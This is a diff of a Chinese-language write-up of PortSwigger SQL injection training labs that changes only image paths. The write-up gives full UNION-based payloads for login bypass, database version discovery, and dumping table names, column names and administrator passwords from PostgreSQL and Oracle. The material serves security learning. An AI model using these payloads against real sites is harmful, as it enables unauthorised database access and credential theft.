@@ -4,51 +4,51 @@
 
 ## 1.实验室：WHERE 子句中的 SQL 注入漏洞允许检索隐藏数据
 
-![image-20250711142328146](D:\ctf wp\portswigger.assets\image-20250711142328146.png)
+![image-20250711142328146](portswigger.assets/image-20250711142328146.png)
 
-进入靶场 选择一个类![image-20250711142514944](D:\ctf wp\portswigger.assets\image-20250711142514944.png)
+进入靶场 选择一个类![image-20250711142514944](portswigger.assets/image-20250711142514944.png)
 
 用单引号'闭合语句 然后注入or 1=1🧊用--注释后面的语句
 
-![image-20250711142643669](D:\ctf wp\portswigger.assets\image-20250711142643669.png)
+![image-20250711142643669](portswigger.assets/image-20250711142643669.png)
 
 
 
 ## 2.实验室：允许绕过登录的 SQL 注入漏洞
 
-![image-20250711143944327](D:\ctf wp\portswigger.assets\image-20250711143944327.png)
+![image-20250711143944327](portswigger.assets/image-20250711143944327.png)
 
-![image-20250711143813555](D:\ctf wp\portswigger.assets\image-20250711143813555.png)
+![image-20250711143813555](portswigger.assets/image-20250711143813555.png)
 
 直接用单引号 闭合 密码验证 --注释掉后面的语句
 
-![image-20250711144246008](D:\ctf wp\portswigger.assets\image-20250711144246008.png)
+![image-20250711144246008](portswigger.assets/image-20250711144246008.png)
 
 
 
 ## 3.实验室：SQL注入攻击，查询Oracle数据库类型和版本
 
-![image-20250711153925698](D:\ctf wp\portswigger.assets\image-20250711153925698.png)
+![image-20250711153925698](portswigger.assets/image-20250711153925698.png)
 
-![image-20250711154047184](D:\ctf wp\portswigger.assets\image-20250711154047184.png)
+![image-20250711154047184](portswigger.assets/image-20250711154047184.png)
 
 能访问到orderby2 说明有两个字段
 
 ' union select '1','2' from dual--  `dual` 是 Oracle 中的一个**虚拟表**，用于从没有实际表的地方进行查询。
 
-![image-20250711155448961](D:\ctf wp\portswigger.assets\image-20250711155448961.png)
+![image-20250711155448961](portswigger.assets/image-20250711155448961.png)
 
 `v$version` 是 Oracle 中的一个**动态性能视图（dynamic performance view）**，用于显示数据库的版本信息和组件信息。
 
-![image-20250711155658561](D:\ctf wp\portswigger.assets\image-20250711155658561.png)
+![image-20250711155658561](portswigger.assets/image-20250711155658561.png)
 
 ## 4.实验室：SQL 注入攻击，查询 MySQL 和 Microsoft 的数据库类型和版本
 
-![image-20250711160841614](D:\ctf wp\portswigger.assets\image-20250711160841614.png)
+![image-20250711160841614](portswigger.assets/image-20250711160841614.png)
 
-![image-20250711162028359](D:\ctf wp\portswigger.assets\image-20250711162028359.png)		
+![image-20250711162028359](portswigger.assets/image-20250711162028359.png)		
 
-这个实验用了#而不是--查阅资料 --后面必须紧贴空格或者换行 所以要在后面再加空格才能生效![image-20250711162438029](D:\ctf wp\portswigger.assets\image-20250711162438029.png)
+这个实验用了#而不是--查阅资料 --后面必须紧贴空格或者换行 所以要在后面再加空格才能生效![image-20250711162438029](portswigger.assets/image-20250711162438029.png)
 
 这样就可以
 
@@ -56,29 +56,29 @@
 
 ## 5.实验室：SQL 注入攻击，列出非 Oracle 数据库上的数据库内容
 
-![image-20250711165132689](D:\ctf wp\portswigger.assets\image-20250711165132689.png)
+![image-20250711165132689](portswigger.assets/image-20250711165132689.png)
 
 先sql注入来登录为止密码的账号
 
-![image-20250711165315627](D:\ctf wp\portswigger.assets\image-20250711165315627.png)
+![image-20250711165315627](portswigger.assets/image-20250711165315627.png)
 
-![image-20250711170514341](D:\ctf wp\portswigger.assets\image-20250711170514341.png)
+![image-20250711170514341](portswigger.assets/image-20250711170514341.png)
 
 报库名：**category=Gifts' union SELECT '1',schema_name from information_schema.schemata--**
 
-![image-20250711180919350](D:\ctf wp\portswigger.assets\image-20250711180919350.png)
+![image-20250711180919350](portswigger.assets/image-20250711180919350.png)
 
 报表名 猜测用户信息在punlic里：**category=Gifts' union SELECT '1',table_name from information_schema.tables where table_schema='public'**
 
-![image-20250711181007618](D:\ctf wp\portswigger.assets\image-20250711181007618.png)
+![image-20250711181007618](portswigger.assets/image-20250711181007618.png)
 
 爆字段名：**category=Gifts' union SELECT '1',column_name from information_schema.columns where table_name='users_ddcldd'**
 
-![image-20250711181048186](D:\ctf wp\portswigger.assets\image-20250711181048186.png)
+![image-20250711181048186](portswigger.assets/image-20250711181048186.png)
 
 爆密码 **category=Gifts' union SELECT '1',password_xsiwdv from users_ddcldd where username_ladwob='administrator'-- **
 
-![image-20250711181428894](D:\ctf wp\portswigger.assets\image-20250711181428894.png)
+![image-20250711181428894](portswigger.assets/image-20250711181428894.png)
 
 最后登录账户即可
 
@@ -86,7 +86,7 @@
 
 ## 6.实验室：SQL 注入攻击，列出 Oracle 数据库内容
 
-![image-20250711184502893](D:\ctf wp\portswigger.assets\image-20250711184502893.png)
+![image-20250711184502893](portswigger.assets/image-20250711184502893.png)
 
 | 目标                                  | 视图名                      | 说明                                          |
 | ------------------------------------- | --------------------------- | --------------------------------------------- |
@@ -98,25 +98,25 @@
 | 📄 所有可访问表的字段                  | `all_tab_columns`           | 当前用户可见所有表的字段信息                  |
 | 库 表 字段                            | user table_name column_name |                                               |
 
-先测试出字段 ![image-20250711184701760](D:\ctf wp\portswigger.assets\image-20250711184701760.png)
+先测试出字段 ![image-20250711184701760](portswigger.assets/image-20250711184701760.png)
 
 查看一下库名（用户名）：**category=Lifestyle' union select '1',username from all_users--**
 
-![image-20250711185051793](D:\ctf wp\portswigger.assets\image-20250711185051793.png)
+![image-20250711185051793](portswigger.assets/image-20250711185051793.png)
 
 其中还能查看自己的用户是peter：**category=Lifestyle' union select '1',user from dual--**
 
 再爆表：**category=Lifestyle' union select '1',table_name from user_tables--**
 
-![image-20250711185608855](D:\ctf wp\portswigger.assets\image-20250711185608855.png)
+![image-20250711185608855](portswigger.assets/image-20250711185608855.png)
 
 爆字段：**category=Lifestyle' union select '1',column_name from user_tab_columns where table_name='USERS_OBKNHE'--**
 
-![image-20250711190002782](D:\ctf wp\portswigger.assets\image-20250711190002782.png)
+![image-20250711190002782](portswigger.assets/image-20250711190002782.png)
 
 获取字段：**category=Lifestyle' union select '1',PASSWORD_TZLNYE from USERS_OBKNHE where USERNAME_YCBRET='administrator'--**
 
-![image-20250711190154295](D:\ctf wp\portswigger.assets\image-20250711190154295.png)
+![image-20250711190154295](portswigger.assets/image-20250711190154295.png)
 
 拿到密码 登录结束
 
